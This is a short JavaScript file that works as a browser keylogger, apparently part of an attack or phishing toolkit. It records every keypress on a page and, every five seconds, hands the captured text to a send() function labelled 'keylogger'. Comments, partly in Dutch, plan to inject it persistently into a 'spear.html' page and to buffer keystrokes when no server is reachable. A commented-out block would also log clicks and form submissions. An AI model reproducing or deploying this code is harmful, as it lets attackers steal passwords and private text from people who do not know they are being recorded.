var keys='';
var counter=0; 

//other events
/*
function addListenerMulti(element, eventNames, listener) {
	  var events = eventNames.split(' ');
	  for (var i=0, iLen=events.length; i<iLen; i++) {
		      element.addEventListener(events[i], listener, false);
		    }
}

addListenerMulti(window, 'click dblclick textInput select change submit reset', function(e){
	keys+='<'+e.type+'>'
});
*/

document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
	counter+=1;
	//lastpressed tijd updaten -> een constante timer checkt of het lang genoeg geleden is (1 second bv) kan setting zijn
	//TODO check if counter is to high
}
window.setInterval(function(){
	if (keys != ''){
		send({'keylogger': keys});
		keys = '';
	}
	//TODO also settings check as must have waited thislong.. or maxtime and waittime sinds last push
}, 5000);


//TODO make persistent in spear.html (injected one)
//TODO in meantime storage if no server 
